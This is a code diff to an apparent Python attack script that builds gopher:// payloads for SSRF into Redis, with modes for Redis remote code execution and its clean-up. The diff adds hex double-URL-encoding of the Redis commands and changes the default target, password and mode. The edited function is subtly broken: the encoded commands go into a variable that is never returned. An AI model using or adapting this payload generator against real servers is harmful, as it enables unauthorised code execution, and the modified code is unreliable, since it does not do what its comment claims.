@@ -137,13 +137,24 @@ def generate_payload(passwd,mode):
 
     protocol="gopher://"
 
-    ip="127.0.0.1"
+    ip="0.0.0.0"
     port="6379"
 
     payload=protocol+ip+":"+port+"/_"
+    payload1=payload
 
+    # 原始版本。不进行编码
+    # for x in cmd:
+    #     payload += quote(redis_format(x).replace("^"," "))
+
+    # 更换为全ascii编码，仅包含'\0123456789abcde'符号。更稳定
     for x in cmd:
-        payload += quote(redis_format(x).replace("^"," "))
+
+        sentence = redis_format(x).replace("^"," ")
+        for c in sentence:
+            
+            payload1 += "%25{:0>2}".format(hex(ord(c)).replace("0x",""))
+   
     return payload
 
     
@@ -154,10 +165,10 @@ if __name__=="__main__":
     # 3 for redis rce ; 31 for rce clean up
     # 4 for info
     # suggest cleaning up when mode 3 used
-    mode=3
+    mode=0
 
     # input auth passwd or leave blank for no pw
-    passwd = '' 
+    passwd = 'root' 
 
     p=generate_payload(passwd,mode)
     print(p)
